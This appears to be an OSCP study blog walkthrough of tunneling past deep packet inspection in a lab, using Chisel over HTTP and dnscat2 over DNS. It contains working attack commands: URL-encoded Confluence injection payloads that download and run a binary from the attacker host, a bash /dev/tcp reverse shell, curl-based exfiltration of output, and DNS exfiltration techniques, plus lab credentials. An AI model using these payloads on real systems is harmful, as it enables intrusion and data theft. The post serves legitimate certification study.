---
title: Tunneling Through Deep Packet Inspection
date: 2024-03-31 09:42:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Tunneling Through Deep Packet Inspection tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Tunneling Through Deep Packet Inspection

Deep Packet Inspection monitors traffic based on a set of rules, most often on a network perimeter where it can identify indicators of compromise. Devices with DPI may be configured to only allow specific transport protocols. 

## HTTP Tunneling Theory and Practice

Imagine this scenario: we have compromised CONFLUENCE01 and can execute commands via HTTP requests. But, when we try to pivot, we're blocked by a restrictive network config. A Deep Packet Inspection (DPI) solution is terminating all outbound traffic aside from HTTP. Also, all inbound ports are blocked aside from TCP 8090. A normal reverse shell will not work here because it would not conform to the HTTP format and would be terminated at the network perimeter by this DPI. SSH remote port forward also would not work because of this. We can only have HTTP traffic reach Kali. We could make requests with Wget and cURL. 

We have creds for PGDATABASE01 but need to SSH directly there thru CONFLUENCE01, which we will do through tunnelling into the internal network resembling an outgoing HTTP connection from CONFLUENCE01.

### HTTP Tunneling with Chisel

```
10.4.212.215 PGDATABASE01
192.168.212.63 CONFLUENCE01
```

Chisel is an HTTP tunneling tool that encapsulates our data stream within HTTP, while laos using SSH in the tunnel so our data is encrypted.

A Chisel server nees to be set up that can accept a connection from a Chisel client. There are many port forwarding options base on our configs. One great option is reverse port forwarding, which is similar to SSH remote port forwarding.

NOTE: There are older tools like HTTPTunnel that have similar functionality but lack the flexibility and cross-platform abilities.

We'll run a Chisel server on Kali that accepts a connection from a Chisel client on CONFLUENCE01. Chisel will bind a SOCKS proxy port on Kali, and the Chisel server will encapsulate what we send thru the SOCKS port and push it thru the HTTP tunnel as SSH-encrypted data. The Chisel client then decapsulates it and pushes it where addressed.

The client to server traffic is HTTP formatted, meaning we can traverse a deep packet solution regardless of the contents of each HTTP packet. The Kali Chisel server will listen on TCP 1080, a SOCKS proxy port. We'll pass all traffic sent to 1080 back up the HTTP tunnel to the Chisel client who will forward it on to its destination.

If our target is running a different operating system, you must download and use the compiled binary for that specific OS and architecture from [here](https://github.com/jpillora/chisel/releases). For ease, this example has both amd64 Linux machines.

```console
// get chisel in Kali's web server
$ sudo cp $(which chisel) /var/www/html/

// start web server
$ sudo systemctl start apache2
```

We'll run this wget command, but encoded, through the injection on CONFLUENCE01.

```
wget 192.168.45.245/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

```console
kali$ curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.245/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

// check the apache2 log file to confirm it worked
kali$ tail -f /var/log/apache2/access.log
192.168.212.63 - - [01/Apr/2024:15:58:47 -0400] "GET /chisel HTTP/1.1" 200 8655115 "-" "Wget/1.20.3 (linux-gnu)"

// start chisel server on kali
kali$ chisel server --port 8080 --reverse
2024/04/01 16:04:26 server: Reverse tunnelling enabled
2024/04/01 16:04:26 server: Fingerprint cBhNABBlLr/wyZs9K2YIAxX3/wl1btZUL71SUlM1owU=
2024/04/01 16:04:26 server: Listening on http://0.0.0.0:8080

// log incoming traffic
kali$ sudo tcpdump -nvvvXi tun0 tcp port 8080
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Now we'll need to start the Chisel client with the CONFLUENCE01 injection using the below command, but encoded.

```
/tmp/chisel client 192.168.45.245:8080 R:socks > /dev/null 2>&1 &
```

```console
kali$ curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.245:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

Nothing happens? There may be something wrong with chisel, but we don't have access to the error. Let's try to see the command output.

```console
kali$ curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.245:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.245:8080/%27%29.start%28%29%22%29%7D/

/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]
```

The error shows that Chisel is trying to use versions 2.32 and 2.34 of glibc,5 which CONFLUENCE01 does not have. (this could be any error that we have to work around). Let's look for a solution.

```kali
kali$ chisel -h
Version: 1.9.1-0kali1 (go1.21.3)

// kali is shipped with 1.8.1 Chisel
// BUT it was also compiled with Go v1.20.7
// this error is common with binaries compiles with Go v > 1.20 that run on OSs without a compatible version of glibc
// we'll just grab Chisel v1.1.8 that is compiled with Go v 1.19 from GitHub

kali$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz

kali$ gunzip chisel_1.8.1_linux_amd64.gz

kali$ sudo cp ./chisel /var/www/html

kali$ curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.245/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

kali$ curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.245:8080%20R:socks%27%29.start%28%29%22%29%7D/

// check Chisel server for connection

kali$ chisel server --port 8080 --reverse
2024/04/01 16:43:40 server: Reverse tunnelling enabled
2024/04/01 16:43:40 server: Fingerprint xCrEQ26tJWg1sKpii175cQfcZG+NcsmYbEGQY2NbXwc=
2024/04/01 16:43:40 server: Listening on http://0.0.0.0:8080
2024/04/01 16:58:29 server: session#1: Client version (1.9.1) differs from server version (1.9.1-0kali1)
2024/04/01 16:58:29 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

// check SOCKS proxy status

kali$ ss -ntplu
tcp   LISTEN 0      4096         127.0.0.1:1080        0.0.0.0:*     users:(("chisel",pid=3125914,fd=8)) 
```

So, our SOCKS proxy port 1080 is listening on the loopback iface of Kali. We'll use the SSH ProxyCommand config option, which accepts a shell command that is used to open a proxy-enabled channel. The documentation suggests using the OpenBSD version of Netcat, which exposes the -X flag9:1 and can connect to a SOCKS or HTTP proxy. However, the version of Netcat that ships with Kali doesn't support proxying, so we'll use Ncat.

```console
kali$ sudo apt install ncat

kali$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.212.215 
```

Success!

## DNS Tunneling Theory and Practice

DNS can serve as a mechanism to tunnel data indirectly in and our of restrictive network environments.

### DNS Tunneling Fundamentals

Let's imagine we have a new server, FELINEAUTHORITY, which is on the WAN next to Kali. So, MULTISERVER03, CONFLUENCE01, and Kali can all route to it, but PGDATABSE01 and HRSHAREs cannot.

FELINEAUTHORITY is this network's registered authoritative name sever for the feline.corp zone, and we will use it to observe how DNS packets reach an authoritative name server. We'll watch DNS packets being exchanged between PGDATABASE01 and FELINEAUTHORITY. While PGDATABASE01 cannot connect directly to FELINEAUTHORITY, it can connect to MULTISERVER03. MULTISERVER03 is also configured as the DNS resolver server for PGDATABASE01.

We can only access PGDATABASE01 through CONFLUENCE01. So in order to connect to the SSH server on PGDATABASE01, we must pivot through CONFLUENCE01.

Since FELINEAUTHORITY is also on the WAN, we can SSH directly into FELINEAUTHORITY using the username kali and the password 7he_C4t_c0ntro11er.

```
192.168.212.7 FELINEAUTHORITY
10.4.212.215 PGDATABASE01
192.168.212.64 MULTISERVER03
192.168.212.63 CONFLUENCE01
```

```console
// get shell to CONFLUENCE
kali$ curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.245/4444%200%3E%261%27%29.start%28%29%22%29%7D/
confluence@confluence01:/opt/atlassian/confluence/bin$ 

// get shell to FELINE
kali$ ssh kali@192.168.212.7 -p 22                                                   
kali@felineauthority:~$ 
```

You should have two open shells now. One on PG as database_admin, and one on FELINEAUTHORITY as kali.

```console
feline$ cd dns_tunneling

feline$ cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

feline$ sudo dnsmasq -C dnsmasq.conf -d
[sudo] password for kali: 
dnsmasq: started, version 2.89 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache

// get another shell on feline

feline$ sudo tcpdump -i ens192 udp port 53
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Now move over to your PGDB shell.

```console
pg$ resolvectl status

Link 5 (ens224)
      Current Scopes: DNS        
DefaultRoute setting: yes        
       LLMNR setting: yes        
MulticastDNS setting: no         
  DNSOverTLS setting: no         
      DNSSEC setting: no         
    DNSSEC supported: no         
  Current DNS Server: 10.4.50.64
         DNS Servers: 10.4.50.64

Link 4 (ens192)
      Current Scopes: DNS        
DefaultRoute setting: yes        
       LLMNR setting: yes        
MulticastDNS setting: no         
  DNSOverTLS setting: no         
      DNSSEC setting: no         
    DNSSEC supported: no         
  Current DNS Server: 10.4.50.64
         DNS Servers: 10.4.50.64

pg$ nslookup exfiltrated-data.feline.corp
Server:		127.0.0.53
Address:	127.0.0.53#53

** server can't find exfiltrated-data.feline.corp: NXDOMAIN
```

Check the FELINEAUTHORITY tcpdump:

```console
18:01:23.183674 IP 192.168.212.64.54161 > 192.168.212.7.domain: 34371+ [1au] A? exfiltrated-data.feline.corp. (57)
18:01:23.183745 IP 192.168.212.7.domain > 192.168.212.64.54161: 34371 NXDomain 0/0/1 (57)
```

An arbitrary DNS query from an internal host (with no other outbound connectivity) has found its way to an external server we control. This illustrates that we can exfil data from inside the network to the outside, without a direct connection, just by making DNS queries.

Exfiltrating a whole file may require a series of sequential requests.

We could convert a binary file into a long hex string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for [hex-string-chunk].feline.corp. On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary.

What if we need to infiltrate data into the network? There are records other than A records, which is what we just looked at. We could use TXT records to infiltrate data into a network.

We can serve TXT records from FELINEAUTHORITY using Dnsmasq. Kill the previous dnsmasq process and check the contents of dnsmasq_txt.conf and run dnsmasq again with this new configuration.

```console
feline$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.

feline$ sudo dnsmasq -C dnsmasq_txt.conf -d
```

Return to PGDATABSE01.

```console
pg$ nslookup -type=txt www.feline.corp
Server:         127.0.0.53
Address:        127.0.0.53#53

Non-authoritative answer:
www.feline.corp text = "here's something else less useful."
www.feline.corp text = "here's something useful!"

Authoritative answers can be found from:
```

This is one way to get data into an internal network using DNS records. If we wanted to infiltrate binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records, and convert that back into binary on the internal server.


### DNS Tunneling with dnscat2

```
10.4.219.215 PGDATABASE01
192.168.219.7 FELINEAUTHORITY
192.168.219.64 MULTISERVER03
192.168.219.63 CONFLUENCE01
172.16.219.217 HRSHARES
```

dnscat2 can be used to exfil data with DNS subdomain queries and infiltrate data with TXT or other records. A dnscat2 server runs on an authoritative name server for a domain and clients that are configged to make queries to that domain are run on compromised machines. 

```console
// inspect traffic from FELINEAUTHORITY
feline$ sudo tcpdump -i ens192 udp port 53

feline$ dnscat2-server feline.corp
Starting Dnscat2 DNS server on 0.0.0.0:53

pg$ cd dnscat/

pg$ ./dnscat feline.corp
Evites Lordy Horror Volume Barons Deepen 

Session established!

// check for connections back to our dnscat2 server
kali$ dnscat2-server feline.corp
New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Evites Lordy Horror Volume Barons Deepen
```

Requests from PGDATABSE01 are being resolved by MULTISERVER03 and end up at FELINEAUTHORITY.

Watch our tcpdump to monitor the DNS Requests to feline.corp.

```console
22:58:34.715885 IP 192.168.219.64.55787 > 192.168.219.7.domain: 10268+ [1au] MX? 664c01979b0d4a8e4428bc00cf5797aafd.feline.corp. (75)
22:58:34.716298 IP 192.168.219.7.domain > 192.168.219.64.55787: 10268 1/0/0 MX d1e701979bb7860434499affff30c27d27.feline.corp. 10 (126)
22:58:35.719982 IP 192.168.219.64.55575 > 192.168.219.7.domain: 22929+ CNAME? dff701979b8e36a32f3c2900d0d6752881.feline.corp. (64)
22:58:35.720434 IP 192.168.219.7.domain > 192.168.219.64.55575: 22929 1/0/0 CNAME 0f5601979b836b15836de4ffff30c27d27.feline.corp. (124)
22:58:36.724108 IP 192.168.219.64.54641 > 192.168.219.7.domain: 45855+ [1au] CNAME? 849201979b3cd848fe5f6400d15837e6a8.feline.corp. (75)
22:58:36.724550 IP 192.168.219.7.domain > 192.168.219.64.54641: 45855 1/0/0 CNAME 392f01979b6134422eb3b2ffff30c27d27.feline.corp. (124)
22:58:37.727791 IP 192.168.219.64.54517 > 192.168.219.7.domain: 34287+ MX? a6c001979b65aeb775f3d100d2dd7e1d87.feline.corp. (64)
22:58:37.728215 IP 192.168.219.7.domain > 192.168.219.64.54517: 34287 1/0/0 MX 847f01979b947537ee43f7ffff30c27d27.feline.corp. 10 (126)
22:58:38.732005 IP 192.168.219.64.54947 > 192.168.219.7.domain: 24467+ [1au] MX? f21501979b0d9eef20a57300d3698c1004.feline.corp. (75)
22:59:03.835132 IP 192.168.219.64.54272 > 192.168.219.7.domain: 35096+ TXT? 3c3f01979bdb59291a373300ec3a50e87b.feline.corp. (64)
```

We see CNAME, TXT, and MX queries and responses. Kill the tcpdump.

It's time to interact with our session from the dnscat2 server.

```console
// list all active windows
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]

dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Evites Lordy Horror Volume Barons Deepen
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

dnscat2> ?

dnscat2> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message

// let's try to connect to the SMB port on HRSHARES through our DNS tunnel
// set up local port forward

dnscat2> listen 0.0.0.0:4455 172.16.219.217:4646
Listening on 127.0.0.1:4455, sending connections to 172.16.219.217:445
```

From another shell on FELINEAUTHORITY, we can list the SMB shares through our port forward.

```console
feline$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234

        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      
```
